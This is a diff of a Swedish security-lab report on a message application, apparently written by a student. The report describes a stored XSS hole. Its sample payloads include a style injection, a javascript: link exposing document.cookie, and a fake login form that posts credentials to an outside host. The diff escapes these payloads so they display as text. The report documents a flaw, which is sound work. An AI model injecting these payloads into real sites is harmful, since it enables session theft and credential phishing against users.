@@ -58,11 +58,14 @@ Tillåt inte tecken så som <>&'"/ som output till dokumentet, utan använd ist�
    
 
 ####Labby Mezzage   
-Applikationen tillåter att 'farliga' tecken skrivs ut i listan med meddelanden. Det innebär att XSS är möjlig. Genom att skicka ett meddelande som t.ex. \<style>div{ background-color:black;}\</style> förändras sidans utseende och samtliga div-taggar (om de inte ändras  efter meddelandet) kommer att få en svart bakgrund. Att hämta ut värdet på sessionskakan är också fullt möjligt med följande script: <a href="javascript: alert(document.cookie)">Link to something funny</a>. Det går t.o.m att rendera upp ett formulär med fält och submit-knapp. <form method="post" action="http://web.andreasbom.se">
-Name:   <input type="text" name="name">
-Password: <input type="text" name="Password">
-<input type="submit" value="Logga in">
-</form>   
+Applikationen tillåter att 'farliga' tecken skrivs ut i listan med meddelanden. Det innebär att XSS är möjlig. Genom att skicka ett meddelande som t.ex. \<style>div{ background-color:black;}\</style> förändras sidans utseende och samtliga div-taggar (om de inte ändras  efter meddelandet) kommer att få en svart bakgrund. Att hämta ut värdet på sessionskakan är också fullt möjligt med följande script: \<a href="javascript: alert(document.cookie)">Link to something funny\</a>. Det går t.o.m att rendera upp ett formulär med fält och submit-knapp.    
+\<form method="post" action="http://web.andreasbom.se">   
+Name:   \<input type="text" name="name">   
+Password: \<input type="text" name="Password">   
+\<input type="submit" value="Logga in">   
+\</form>     
+
+
 
 
    
